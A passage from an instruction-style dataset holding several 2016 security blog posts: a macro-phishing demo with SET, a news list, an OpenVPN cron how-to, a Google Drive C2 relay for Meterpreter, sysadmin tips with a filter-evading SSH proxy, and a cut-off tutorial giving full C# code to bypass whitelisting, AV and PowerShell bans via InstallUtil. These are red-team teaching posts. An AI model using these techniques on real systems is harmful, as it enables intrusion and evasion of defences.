start the process of architecting / designing for proper error detection, and error correction/response to outliers.\n\nAs a consequence, our software, and various human resources must work in a cooperative fashion.  LDAP and/or Active Directory must be enabled to drive micro-level network enforcement decisions and link the entire communications profile together from the perspectives of internal network segment to allowed/permitted Internet resources, and Internet perimeter communications profile.\n\nOur very survival mandates that we move away from reactive solutions to a proactive design for success, and correct failure stance.  Staying with an exclusive reactive point solution approach will no longer scale, and will ensure your personnel remain in a fire fighting mode, and will also prevent them from maturing as analysts to deal with the more sophisticated landscape we now face.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Time To Bash on Windows (Bourne Again Shell That Is)\"\nTaxonomies: \"How-To, Azure, Bash Commands, Linux, phishing, PowerShell, Social Engineering Toolkit, Windows, Windows10\"\nCreation Date: \"Wed, 10 Aug 2016 15:32:45 +0000\"\nEditor's Note: This is another awesome guest post from our friend, Robert Schwass. If you'd like to guest post contact us here.\nRobert Schwass //\n\nI had heard the rumors about the Windows Subsystem for Linux (WSL) and recently I watched a demo video using it for devops to push updates to a Linux-based web server in Azure with a bash shell.\nHas this put a stop to the endless Windows vs Linux debate?\nMost likely not, But I don't subscribe, and who really cares?\nI was however presented with a solution for the age-old question:\nHow can I create PowerShell payloads and push them out with tools that only run on Linux with ease?\nSo the research began.\nI decided to drink the Kool-Aid and opt-in to the Windows 10 Insider Program.\nThe first step is of course to set up your Windows 10 system for the Insider Preview Program, and get bash up and running. If you need help with that consult the internet.  There are many guides to setting the environment up. I personally downloaded the latest ISO from Microsoft and did an upgrade install by mounting it inside the OS and running setup.exe. From there you simply add the feature to Windows 10 and you're up and running bash. (Approx 45 Min)\nI have been working with macros extensively lately and have created a PowerShell script (PSPayload) that will generate macros from PowerShell scripts and even create the Excel file.\nI have always been a huge fan of the Social Engineering Toolkit (SET) and how easy it is to send out Phishing attacks. Although this tool is Python based and does run on Windows; the Windows version lacks functionality, the Linux version is full featured.\nSo my next step was to get SET running within the subsystem environment. If you want all the features of SET, which I do; you also have to install Metasploit. Getting Metasploit and all of its dependencies installed took some research, but I have provided a list of commands to run here to save anyone interested some headache. Mainly the issues were getting a solid copy of Ruby installed.\nNow SET by default allows you to use Metasploit to generate payloads such as PDF\u2019s and ZIP files to be sent out in Phishing attacks, but I couldn't quite figure out how to use an external file with the SET Framework as is. This functionality may exist by default, full disclosure I\u2019m a newb. I created the feature request on the SET Github nonetheless. Until I hear back from the SET devs, I made my own work around by copying and modifying the email script SET uses and putting it in SET\u2019s root directory. The script can be downloaded from here.\nThe script utilizes core functionality and modules within the framework so it has to be in the root directory of SET, in my case /opt/set within the bash environment.\nDemo\nPhase 1. Create the PowerShell Payload aka Macro aka Excel .xls file\n\n(The payload is a simple \u2018get-process;read-host\u2019, list processes and pause.)\nThe .xls file has been created, and also a .txt file that contains just the macro. Let\u2019s examine the .xls file. (In Excel Developer Tab \u2192 VBA button)\nClick on the \u201cThisWorkbook\u201d item Under VBAProject to view the macro.\n\nThe \u201dThisWorkbook\u201d Object will execute the created macro once the document opens. The user will have to allow macros, but they are easily fooled most of the time.\nThe macros generated by PSPayload by default run in the background.  I will edit the one in this demo by removing the \u201c-NoP -NonI -W Hidden\u201d so we can see the results later.\nPhase 2. From Bash Send the Email\nSET has a series of questions it asks.\n\nI want to keep the file name.\n\nFor this demo I do a single email but you can easily read addresses from a list with Mass Mailer.\nSet the Subject, Plain Text or HTML, and The Body.\n\nI used the same Gmail for sender and recipient.\n\nSet the sender name, password, and if you want to flag the email as important.\nIf everything worked you will see the above.\nMessage is in my inbox\n\nInside we see the message body an attachment.\n\nDownload the attachment, open it, and enable editing and enable content.\nRemember the PowerShell oneliner was a \u201cget-process;read-host\u201d which is what the windows that popped up showed. Also, remember I intentionally disabled the stealthiness.\n\nConclusion\nSo there you have it. I used a Linux-based tool to push out a payload I created with PowerShell, all on a Windows system. This is just the first of what could be some great tool combining utilizing WSL.\nAnother cool feature is that you can delete and reinstall the entire bash filesystem and start from scratch with a few commands in the cmd prompt.\nlxrun /uninstall /full\n\nlxrun /install\nPSPayload can take much larger and more complex scripts and put them into macro form. I have tested it with multiple line scripts and even payloads generated from the PowerCat module. All of that information is available on the Github.\nCaveats\nWSL is still very very new and it is seriously limited.  For example, it cannot open network sockets and has trouble sending ICMP packets. The networking issues limit SET\u2019s capabilities to send out it\u2019s own payloads and start listeners. So this concept currently is not ready for prime time. However, Microsoft is developing this at a very fast rate, and I suspect in the near future they may have the networking bugs fixed.\nI did reach out to TrustedSec on Github, and since conducting this research they have added the functionality into SET to use email attachments not generated with SET itself. So if you are using the latest version of SET you may not need to use my Email_attachment.py script.\nMetasploit does not run correctly by itself, I just needed it to satisfy SET. Hopefully in the future Metasploit will be up and running in this environment as well.\nNow, I know this will never replace Linux running via boot disk or installed to the PC directly accessing hardware. There are many cases when you simply must use Linux such as for wireless network audits. This idea is not intended to replace Linux but merely enhance Windows.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 081216\"\nTaxonomies: \"InfoSec 101, News, Apple, boot key, bug bounty, Exodus, Microsoft, TCp attack\"\nCreation Date: \"Fri, 12 Aug 2016 15:18:10 +0000\"\nLawrence Hoffmann //\n\nSo, Apple announced a new bug bounty program at BlackHat, and there are some interesting deviations from the norm in their plan to implement and pay out. First of all, Apple will be selecting a core group of researchers to be eligible for bounties, so no, a person cannot simply find a bug in Apple and get a bounty for it. Rather your submission of a serious bug may get you considered for the approved group. One notable thing about this bounty was that Apple is offering $200,000 for bugs found in its secure boot firmware. That\u2019s a huge number of dollars, and also a rather small target. However, as many have pointed out about bug bounties and the major operating system manufacturers, there are people willing to pay much more for that bug. Case and point: Exodus Intelligence has announced they\u2019ll pay out $500,000 for the same bug. The Register has a far more witty rundown if you\u2019re interested.\n\nhttp://www.theregister.co.uk/2016/08/11/exodus_intelligence_500k_bounty/\n\nIt would seem Microsoft has lost control of a key generated specifically to backdoor the secure boot features on many devices. The researchers are quoted in the Ars Technica article pointing out to the FBI that this is what happens when there\u2019s a back door with a \u201csecure golden key.\u201d Now if OPM can\u2019t do any better with your files than to store them as PDFs on unencrypted media, how do we expected any branch of the government to keep up with their precious golden key. Something tells me this isn\u2019t the last time we\u2019ll learn this lesson either. \n\nhttp://arstechnica.com/security/2016/08/microsoft-secure-boot-firmware-snafu-leaks-golden-key/\n\nhttp://mjg59.dreamwidth.org/44223.html\n\nThere is a new \u201cOff path TCP\u201d attack described by this paper which could allow an attacker to inject packets into a TCP stream from \u201coff path.\u201d This is difficult because sequence numbers are randomized and typically the attacker must have some way of knowing if the victim hosts are currently communicating and on what port. Linux is the only operating system currently suffering from this attack and that is due to the fact that it\u2019s the only operating system with a completely and correctly implemented off path attack mitigation system as described in RFC 5961. It is that mitigation system which this attack is exploiting. It should be noted that this attack can still be mitigated by tuning sysctl\u2019s tcp_challenge_ack_limit to something absurdly large.\n\nI have been curious for a while about bug bounty programs and their payouts. I\u2019ve seen a few stories of great success where an airline paid out enough free miles for the bounty hunter to see the world or a company spelled their name in the numbers of the paycheck (Google), and a few horror stories where the bounty client claimed the bug was not a security issue, fixed it and stiffed the the bounty hunter. All in all it has always seemed like too much work to get into only to find out that an XSS is not \u201cin scope\u201d and therefore no one will be paying up. That makes this article by @albinowax an interesting read.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Its Always Nice to Have Cron-ies!\"\nTaxonomies: \"How-To, Linus, n00b, red tape, VPN\"\nCreation Date: \"Tue, 16 Aug 2016 16:25:41 +0000\"\nRick Wisser //\n\nI have been asked by some friends, (not very Linux proficient friends) to share this. I thought I would create a blog post and share with all. We all had to start somewhere and sometimes we forget that not everyone is an avid Linux user. Just like I'm not an avid beer maker\u2026.. (yet!)\nI was hanging out with a couple of my old Admin friends about a month ago and the question of VPN\u2019s came up. Everyone commented on what VPN they use at work and at home. OpenVPN was mentioned as it is a great software solution and found to be rather easy to implement. One of them mentioned that they wish they would implement a scheduling solution so that they could limit access during updates and also have the flexibility to allow interns only access during certain hours. We all got a good laugh out of that but then realized he was serious. This lead to a deep discussion about the companies that everyone works or had worked for and the red tape that seems to run along with them. Did I mention that I love BHIS! I think that if there was red tape it got handed out at a conference somewhere with one of our awesome T-shirts.\n\nKeep fighting my friends, keep fighting!\nAfter I got home I thought about the comment of limiting access and the ability to have a schedule in place for the OpenVPN solution. For some reason I have this curse which causes my mind to run crazy with small trivial things that I somehow twist into a challenge. I believe that my friends do this to me on purpose sometimes because they are just evil like that. I have to admit that a lot of the stuff that they come up with is really trivial but sometimes it poses as a challenge far more than just solving a solution, in which it could include solutions for other problems.\n\nDon\u2019t ask!\nThe next day I decided to look further into the scheduling solution since I have an OpenVPN server installed in my lab at home. With a little research on the OpenVPN website I found command line syntax to disable user access as well as suspend their account. The following commands were found on the OpenVPN website https://docs.openvpn.net/docs/access-server/openvpn-access-server-command-line-tools.html#session-management\n\nBan a User Command Line Syntax for OpenVPN Server\n\nDisconnect a User Command Line Syntax for OpenVPN Server\nNow that I know the command line syntax it was time to create a bash script so that it could be called later to disconnect and ban a user. Notice there is a nice addition to the disconnect user command which lets you give them a reason for the disconnect.\nIn my past life I used to work for a contract manufacture of printed circuit boards which consisted of computer motherboards, telephone equipment, SCSI controllers, medical devices and so on. Most of the functional bench testing was done with cron jobs because almost always the first part of the test was to set the time to the default (again with a script) so that times it took to test could be caught and utilized to determine if there were propagation delay issues, especially in CPU and Ram timing. Therefore, we would run bash scripts to launch various tests at specific points in time. This was very affective in finding timing issues with the bus speeds of the devices and seemed to be the easiest way to implement them at that time. Now I am sure there are far better ways to do this.\nCreating a bash script is really easy. Login via SSH, escalate to root (sudo su), then create a directory to hold your bash scripts. Then cd into that directory. Root access is needed since it is required to run the OpenVPN scripts.\nmedic@openvpnas:~# mkdir ~/scripts\n\nmedic@openvpnas:~# cd scripts\n\nmedic@openvpnas:~/scripts#\nThen use VI or Nano to create the name of the bash script (e.g. vi discbanuser.sh or nano discbanuser.sh). This will open a blank file called discbanuser.sh in the current directory.\nmedic@openvpnas:~/scripts# nano discbanuser.sh\n Then input the information below in order to run the commands you have to be in the scripts directory below. This is a different directory than the directory you just created.\n\nBatch Script to Disconnect and Ban the User\nNow we have our batch script for disconnecting and banning a user from our OpenVPN lets create another Bash Script to unban or allow them to connect again to the VPN Server. This will be created in the same ~/scripts directory as the discbanuser.sh and we will call it unbanuser.sh.\n\nBash Script to Allow User to Connect to VPN\nWe now have our bash scripts created therefore it is time to make sure the permissions are correct for these files to be executed. Not that it is:  ls \u2013(lowercase L).\nmedic@openvpnas:~/scripts# ls \u2013l\n\nTotal 8\n\n-rw-r--r-- 1 root root 1010 Aug  8 15:30 discbanuser.sh\n\n-rw-r--r-- 1 root root  428 Aug  8 15:33 unbanuser.sh\n\nmedic@openvpnas:~/scripts#\nNote that the files are not allowed to be executed so we need to change that.\nmedic@openvpnas:~/scripts# chmod 755 discbanuser.sh\n\nmedic@openvpnas:~/scripts# chmod 755 unbanuser.sh\n\nmedic@openvpnas:~/scripts# ls \u2013l\n\nTotal 8\n\n-rwxr-xr-x 1 root root 1010 Aug  8 15:30 discbanuser.sh\n\n-rwxr-xr-x 1 root root  428 Aug  8 15:33 unbanuser.sh\n\nmedic@openvpnas:~/scripts#\nNow the bash scripts are executable we can work to schedule them with crontab.\nCrontab or you may have heard of them as Cron Job or Cron. Is a scheduler for Linux. All Linux users have used them for one task or another as it may be used for scheduling reboots, updating and various other tasks. There is a short funny read about an individual who created different scripts to automate his most mundane tasks which can be found here: https://what.thedailywtf.com/topic/17997/now-that-s-what-i-call-hacker In fact I am still waiting for BHIS to get us a coffee maker that hooks up to the network\u2026\u2026.\nMoving on\u2026\nI have an OpenVPN virtual machine running so to schedule a task just type following command:\nmedic@openvpnas:~/scripts# crontab -e\nThis will open up crontab file for the current user which is what the \u2013e means.\nThe crontab file it gives you information about what syntax to utilize as you can see below:\n\nCrontab File with Calls to Bash Scripts\nAs you can see by the file I have already placed calls to my discbanuser.sh and unbanuser.sh scripts. These tasks will run at 10:00pm and 10:30pm respectively on the first day of the week. Now we can save the file and then check to see if it works.\nI logged into the VPN as ricktest, a user I created earlier. I waited for the message to arrive that I had been disconnected from the server.\n\nI got the message that I was disconnected as well as the message that I included in the command within the bash script. That worked well.\nNow to try and connect to the VPN Server again:\n\nJust what was expected!\nI then tested again after the script had unbanned the account and I was again able to login.\nEven though this is simple example, hopefully it will give those newbies to Linux and my friends a foothold into the world of crontab. As you can see the sky is the limit as what scheduled tasks and bash scripting can be used for.\nMake sure you check out the link mentioned previously in this blog for some more fun and advanced examples.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 081916\"\nTaxonomies: \"InfoSec 101, News, 4A, Cryptography, Election2016, Gov Hacking, hardware hacking, Microsoft, PowerShell, reverse engineering, Tinfoil Hat, Weird Stuff\"\nCreation Date: \"Fri, 19 Aug 2016 17:35:03 +0000\"\nLawrence Hoffman //\n\nSo Microsoft is open sourcing PowerShell and putting it on Linux. Realistically Linux already has a full suite of administrative tools and some very powerful scripting languages that I feel do anything you\u2019d want to do with PowerShell, but faster and safer. However, it makes me wonder how long it will take the folks over at PowerShell Empire to turn this recent development into a very handy tool for administering other people\u2019s Windows systems from the comfort of your *nix based machine.  https://blogs.msdn.microsoft.com/powershell/2016/08/18/powershell-on-linux-and-open-source-2/\n\nThis article is a little older, but I\u2019d missed it initially, this past week @EthanRobish mentioned it to me and having not seen it he sent a link. The article itself is a great read, and *cough, puts on tinfoil hat* I have always said that with something as important as an election I\u2019d personally be totally surprised if it weren\u2019t being hacked at some level. This article seems to speak to the validity of that suspicion. http://www.bloomberg.com/features/2016-how-to-hack-an-election/\n\nDisclaimer: Long article that contains assembly language. I have posted some articles on hardware hacking before, it\u2019s something that I\u2019m curious about but unfortunately have never gotten around to. This article is fantastic. It gives a really great rundown on how the author reasoned through the challenge of reverse engineering some router binaries as well as a finding right at the end (which I won\u2019t ruin for you.) http://blog.ioactive.com/2016/08/multiple-vulnerabilities-in-bhu-wifi.html\n\nEFF: Lets not wait to talk about government sponsored hacking. @ncardozo and @agcrocker wrote a blog post which looks at the fact that we\u2019ve been given plenty of evidence that the US government has no moral qualms with using technology to push the limits of the fourth amendment well beyond where most Americans would probably draw a line. https://www.eff.org/deeplinks/2016/08/we-shouldnt-wait-another-fifteen-years-conversation-about-government-hacking\n\nI like weird things. Esoteric things. I had a lot of fun (probably more than is normal) reading through this post. I think the first section was my favorite. http://blog.bjrn.se/2016/08/cabinet-of-curiosities-bunch-of.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Google Docs becomes Google SOCKS: C2 Over Google Drive\"\nTaxonomies: \"C2, Red Team, C2, Google Drive\"\nCreation Date: \"Wed, 24 Aug 2016 16:16:18 +0000\"\nLuke Baggett //\nIf you\u2019re monitoring a network with internet access, it's almost inevitable that you\u2019re going to see a lot of traffic to and from Google servers. Blending in with Google traffic by using Google as a relay may help an attacker avoid detection.\nHow could an attacker use Google as a relay? One way is with the Drive API, which allows automation of uploading and downloading of data through Google Drive. The API is simple and quick enough to allow for relatively solid communication between two systems. SSH, Metasploit Meterpreter sessions, and more can be relayed through Google\u2019s servers using this API.\nI\u2019ve created a script called google_socks.py as a proof of concept. The script starts up a Python socket object, and each set of new data from the socket is pushed to drive as a new file of a specific name. Each script knows what files to read due to their names. The below diagram illustrates how two systems can communicate via this method.\n\nThe client on the left read files named \u201cFile 2\u201d, and creates new files named \u201cFile 1\u201d. The client on the right does the opposite. When using this method, the two sockets should be able to function as if they were directly connected, but with additional latency.\nJust how well does this work? Let\u2019s look at a few demos:\nBasic Data Transfer and Shell\n[embed]https://youtu.be/obtjoDRLcRs[/embed]\nIn this video, both google_socks.py scripts listen on local ports for Netcat clients. The scripts then forward data between their sockets and Google Drive, allowing the Netcat clients to communicate.\nThe argument \u201c-P 0.2\u201d specifies a polling interval of 0.2 seconds, \u201c-j 0\u201d specifies 0 polling randomization (aka jitter), and \u201c-c 0\u201d tells the script to use the zeroth set of credentials stored in the script. Doing these things helps prevent API request rate limiting, which happens when one API client sends more than 10 queries per second to the server.\nSSH\nThere is a tradeoff involved with using Google Drive as a relay. You get high throughput, but high latency as well. This becomes more noticeable when using things where small packets need to be sent and received in quick succession, like SSH.\n[embed]https://youtu.be/oBCCU9al3Fs[/embed]\nIn the above video there is one instance of google_socks.py listening on the local port 9090, and one instance which connects to a remote SSH server on port 22. The SSH client then connects to local port 9090, and the traffic is forwarded through Google Drive to the remote SSH server.\nMeterpreter\n[embed]https://youtu.be/dF2DzehDeKo[/embed]\nLinux Host: 192.168.56.1\nWindows VM: 192.168.56.101\nKali VM: 192.168.56.102\nIn this demo, Meterpreter communicates with a multi-handler via Google Drive. The Kali VM produces a Meterpreter payload which connects to the Linux Host at 192.168.56.1 port 9090. The Linux host listens on 192.168.56.1 port 9090, then forwards the data to Google Drive. Another google_socks.py script relays data from Drive to the mutli handler on the Kali VM at 192.168.56.102 port 9090.\nThe payload is executed on the Windows VM and the Meterpreter session opens. It takes a moment for things to load fully so that meterpreter accepts commands, which is why the process list command fails initially. The screenshot command is run, and it works perfectly.\nWant to try this out yourself? You can download the PoC script here on my github.\nYou\u2019ll need to run --setup, which will explain how to set up API access for yourself.\nHere are some good resources on the python client library:\n\nhttps://google.github.io/google-api-python-client/docs/epy/googleapiclient-module.html\nhttps://developers.google.com/resources/api-libraries/documentation/drive/v3/python/latest/index.html\nhttps://developers.google.com/resources/api-libraries/documentation/drive/v2/python/latest/index.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Reminders - Simple Security and Finding Sanity In the Digital Age\"\nTaxonomies: \"Author, InfoSec 201, Jordan Drysdale, apricorn, bash history, evading content filters with SSH, exif-tool, histcontrol, peach jam, personal google maintenance, photo scrubbing, pickles, yubico, yubikey\"\nCreation Date: \"Mon, 29 Aug 2016 14:59:09 +0000\"\nJordan Drysdale //\n\nAs I wander through life, in what now seems like a world gone entirely mad, disconnecting from digital is my newest hobby. Information overload constantly smashes us in the face at every turn. I try to maintain overload data in a collection of bookmarks, mental notes, recurring nightmares, scrawl and Post-It\u2122 notes on my cubical wall. Without further ado, here are a few favorites, Post-It\u2122 notes and personal disconnects from the annals of a sysadmin.\n\nFor those who live and work inside a shell, did you know that you can paste strings into a shell easily with CTRL + SHIFT + v? Another paste trick that had Lawrence thanking me infinitely after he spent the last couple years manually entering our brutal 25 character randomized strings into VMs - you can paste directly into a virtual machine using VMWare Workstation. Yes, we know you can integrate your VMs with tools to make everything less secure. Yeah, so...select the field in the VM you want to paste in to, ALT + CTRL to escape the mouse capture, copy your string and navigate to Edit > Paste in Workstation.\n\nDid you remember that you can hide from bash history by tagging the spacebar in front of your commands? Yup, by default the HISTCONTROL variable is set to 'ignorespace' and can be modified to also 'ignoredups' or 'ignoreboth.' Link for reference and picture proof, try it:\n\nChange can be difficult, but the boss just asked \u201cIf I gave you an extra hundred bucks a day, that\u2019s change too, right?\u201d. So how do I change the tone of this blog from semi-technical randomness and the ignorespace variable to my garden? Like in life, it usually happens when I executed something idiotic in a shell a co-worker might see. Regardless of how we make the transition, the garden and green space are one of my favorite places to hide from my phone and the travails of Internet life. Cucumbers are as easy as anything to grow; place seeds in dirt add water. Pickles are one of my all time favorite foods. Grow cucumbers, garlic and dill. Buy jars and salt. Set up your canning rig. Profit. Mmmmmmm\u2026.pickles.\n\nIt hasn't been so long since the article about cleansing your history from the omnipotent overlords of the information age, but it seems like an eternity. Since, well, yeah....I just had to cleanse location data and maps and location data, personal searches, et cetera again. My search history is littered with recipe requests, odd facts, historical trivia, movie quotes, YouTube [TM] requests and command strings.. Frightening what they maintain - caution, toothy link. Quiet reminder...if you aren't paying money for it, you're not the customer.\n\nIn the spare time I create in life, I also love making jams, jellies and salsa. Disconnect digital device, check. Baste peaches and peel, check. Boil sugar, peaches and pectin, check. Fire up the water bath, fill jars, rock and roll. Boom!\n\nSince we are talking about hiding, covering our tracks and so forth, don't forget to scrub your picture files of meta data before uploading them to the Internet. For Linux, the exif-tool is rad. Also, this blog_post  is an amazing guide for how to hide on the Internet. Digressed again...Anyway, I borrowed this for loop wandering about the Internet, so credit is due to someone, somewhere:\n\n$ pwd\n/some/pic/dir/\n$ for i in *.jpg; do echo \"Processing $i\"; exiftool -all = \"$i\"; done\n$ for i in *.png; do echo \"Processing $i\"; exiftool -all = \"$i\"; done\n\nYou want to shrink those pictures too? Go grab imagemagick (Linux) and do something like this:\n\n$ for file in *.png; do convert $file -quality 60 shrunk-$file; done ##60 here represents a percentage quality reference\n$ for file in *.jpg; do convert $file -quality 60 shrunk-$file; done\n\nRef: http://www.howtogeek.com/109369/how-to-quickly-resize-convert-modify-images-from-the-linux-terminal/\n\nSocks proxies are fun too and depending on where you are in the world and if you are restricted, you might still be able to evade filters. Two commands, the first to create a localhost socket and the second to launch chrome with a socks proxy.\n\n$ ssh -D 3333 -f -C -q -N -p 2222 evader@12.34.56.78 ###assumes ssh is listening on 2222 at 12.34.56.78\n$ google-chrome --proxy-server=\"socks://localhost:3333\"\n\nIn your browser, visit icanhazip.com and you should see the text string of 12.34.56.78.\n\nLet\u2019s remember to secure all the things!!! These folks make our favorite external drives in the whole known universe: Apricorn (@apricorn_info). They just released a new Secure USB 3 with the following awesomeness in quotes - \"Data written to the drive is encrypted on the fly using military-grade, full-disk AES 256-bit XTS hardware encryption. It's also FIPS 140-2 Level 3 validated...\" and is designed to Inspector Gadget self-destruct in response to brute force attempts. Trust me, if your organization takes 'data in transit' security seriously, something in this_product_matrix can solve those problems for the foreseeable future.\n\nIf you haven\u2019t heard of Yubico or seen their products, take a look. They produce a series of USB \u201ctoken\u201d products that can be used for strengthening authentication across a multitude of services: Docker / Github / Google Apps / Password Databases / your SSH systems\u2026 They are quickly gaining traction and this is a solution I would love to see in more businesses. Oh yeah, and for paranoia enthusiasts, these are manufactured in the US and Sweden.\n\nArticle summary review: Yubikey is awesome for protecting super sensitive things and password files...like KeePass/LastPass. Apricorn (@apricorn_info) literally makes one of the most secure external drives on the market today. Cleanse and shrink your pictures before posting them and find a hobby, like photography, gardening, something. Clean up your google history too! Last - don't forget to disconnect once in awhile.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Powershell Without Powershell - How To Bypass Application Whitelisting, Environment Restrictions & AV\"\nTaxonomies: \"Author, Beau Bullock, Brian Fehrman, Red Team, Red Team Tools, how to bypass Anti Virus, How to bypass AV, How to bypass whitelisting, PowerShell, PowerShell without PowerShell, What to do when PowerShell is banned\"\nCreation Date: \"Wed, 31 Aug 2016 15:08:26 +0000\"\nBrian Fehrman (With shout outs to: Kelsey Bellew, Beau Bullock) //\n\nIn a previous blog post, we talked about bypassing AV and Application Whitelisting by using a method developed by Casey Smith. In a recent engagement, we ran into an environment with even more restrictions in place. Not only did they have AV and Application Whitelisting, but they were also blocking the use of PowerShell and cmd.exe. We have run into a few instances where this was the case. More and more, companies are realizing that normal users don\u2019t need access to cmd.exe, PowerShell, or other cool tools. We feel that these are excellent steps to take in securing an environment. Defenders must realize, however, that there are potential ways around these restrictions.\n\nIf you\u2019ve ever watched our Sacred Cash Cow tipping series, you\u2019ve likely seen the method that I developed for executing the Invoke-Shellcode.ps1 file from within a C# program. Essentially, you turn the Invoke-Shellcode.ps1 file into one, long, single-line and embed it as a string variable within the C# program. The result is a stand-alone executable that spawns a meterpreter shell and bypasses most AV products. Teaser Alert: the full walkthrough for that will come in a future video blog-post.\n\nSo what does that have to do with this blog post? Well, we can extend that concept to allow us to execute any PowerShell script within an environment that doesn\u2019t otherwise allow for PowerShell execution. How does it work? The magic is in the fact that both C# and PowerShell are effectively just frontends for the .NET framework. We are taking advantage of the fact that we can use C# executables to directly call the same .NET functionality that is accessed by PowerShell. If you wanted to, you could just write C# programs to do whatever your PowerShell scripts do...but why go through all that work when you already have the PowerShell scripts?\n\nEnough talk, let\u2019s do this! Create a new, blank text-file on your Windows Desktop and name it Program.cs. You can call it whatever you want...but that\u2019s just a suggestion. Open it up in an editor, such as NotePad++. First, we need to import some functionality by adding the following using statements to the top of the file:\n\nusing System;\n using System.Configuration.Install;\n using System.Runtime.InteropServices;\n using System.Management.Automation.Runspaces;\n\nIn order for our program to compile properly, we need to define a class that contains a method named Main(). Typically, this would be the main entry point into our program. We will call our class the same name as our Program.cs file. Add the following lines to the end of your Program.cs file:\n\npublic class Program\n {\n public static void Main()\n {\n }\n }\n\nThe next step is to define the true entry point for our program. We will be using the InstallUtil.exe utility to run our program rather than executing it directly. This is the wizardry that can allow us to bypass application-whitelisting restrictions. In order to do this, we define a class named Sample that inherits from the Installer class. We then declare a method named Uninstall, which will be the true entry point to our program. In this case, the first task our program will perform will be to call a method named Exec that is part of a class named Mycode. We also add a statement above the class declaration to say that this method is expected to be run as part of an installation process. Add the following lines to the bottom of your Program.cs file:\n\n[System.ComponentModel.RunInstaller(true)]\n public class Sample : System.Configuration.Install.Installer\n {\n public override void Uninstall(System.Collections.IDictionary savedState)\n {\n Mycode.Exec();\n }\n }\n\nThe final piece to our program is to define the Mycode class and a method named Exec. The method reads in a PowerShell script that is located at the path that is defined in the @\u201d \u201c notation. In this case, my PowerShell script is located at C:\\Users\\fmc\\Desktop\\PowerUp.ps1. The lines that follow this are used to set up variables and parameters that are needed in order to execute the PowerShell script. Finally, the PowerShell script is executed with the pipeline.Invoke() call. Add the following lines to the end of your Program.cs file:\n\npublic class Mycode\n {\n public static void Exec()\n {\n string command = System.IO.File.ReadAllText(@\"C:\\Users\\fmc\\Desktop\\PowerUp.ps1\");\n RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();\n Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);\n rspace.Open();\n Pipeline pipeline = rspace.CreatePipeline();\n pipeline.Commands.AddScript(command);\n pipeline.Invoke();\n }\n }\n\nThe entire Program.cs file should look as follows:\n\nusing System;\n using System.Configuration.Install;\n using System.Runtime.InteropServices;\n using System.Management.Automation.Runspaces;\n public class Program\n {\n public static void Main()\n {\n }\n }\n [System.ComponentModel.RunInstaller(true)]\n public class Sample : System.Configuration.Install.Installer\n {\n public override void Uninstall(System.Collections.IDictionary savedState)\n {\n Mycode.Exec();\n }\n }\n public class Mycode\n {\n public static void Exec()\n {\n string command = System.IO.File.ReadAllText(@\"C:\\Users\\fmc\\Desktop\\PowerUp.ps1\");\n RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();\n Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);\n rspace.Open();\n Pipeline pipeline = rspace.CreatePipeline();\n pipeline.Commands.AddScript(command);\n pipeline.Invoke();\n }\n }\n\nIn this example, I am using Veil-Framework\u2019s PowerUp script. Previously, you\u2019d run the script from within a PowerShell prompt and output the results to a file by doing something like the following:\n\nImport-Module PowerUp.ps1\n Invoke-AllChecks -Verbose | Out-File C:\\Users\\fmc\\Desktop\\allchecks.txt\n\nIn order for the function to be called with this method, we need to add an explicit function call to the end of the script. Open up the PowerUp.ps1 script and add the function call to the very bottom of the file. Make sure to name your Out-File parameter to suit your environment. Save the script and exit.\n\nInvoke-AllChecks -Verbose | Out-File C:\\Users\\fmc\\Desktop\\allchecks.txt\n\nNow we need to compile our program. We are going to use the csc.exe utility to perform the compilation. We have to pass in a couple of flags in order for the program to properly compile. The following command can be used to compile the Program.cs file and generate an executable named powerup.exe:\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe\n/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__\n31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:anycpu\n/out:C:\\Users\\fmc\\Desktop\\powerup.exe C:\\Users\\fmc\\Desktop\\Program.cs\n\nBut...wait...what if cmd.exe is locked down? No worries. Open File Explorer and navigate to:\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\\n\nRight-click on the csc.exe file and choose Create shortcut. You will get a message saying that you can\u2019t create a shortcut there and it will prompt you to create one on your desktop. Just click yes.\n\nNow, head to your desktop. Right-click the csc.exe shortcut and choose Properties.\n\nClick on the Shortcut tab, select all of the text in the Target field, and then replace it with the following text (making sure to replace C:\\Users\\fmc\\Desktop\\powerup.exe with a filename that will match your environment):\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe\n/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__\n31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:anycpu\n/out:C:\\Users\\fmc\\Desktop\\powerup.exe\n\nThen, click Apply and close the Properties window. What we\u2019ve done here are specified parameters to pass into csc.exe when we use this shortcut to execute it. The Program.cs path is purposefully left off for two reasons. The main reason is that the Target field has a maximum character limit and adding in the full path to your Program.cs file will likely exceed this limit. The full path to the Program.cs file will automatically be passed as an argument to the csc.exe program during the upcoming drag-and-drop step of this tutorial.\n\nTo compile your Program.cs file, simply drag and drop the Program.cs file onto the csc.exe shortcut icon on your desktop. If everything went well, you should get a powerup.exe file on your desktop. Congrats, you just compiled a CSharp program without using the command line or Visual Studio!\n\nFinally, we need to run our program by using the InstallUtil.exe utility. This process will be similar to how we used the csc.exe application. Navigate back to:\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\\n\nRight-click on the InstallUtil.exe file and choose Create shortcut. You will get a message saying that you can\u2019t create a shortcut there and it will prompt you to create one on your desktop. Just click yes.\n\nHead to your Desktop, right-click on the InstallUtil shortcut and click Properties.\n\nUnder the Shortcut tab, delete everything in the Target field and replace with the following (making sure to change the log file name to match your 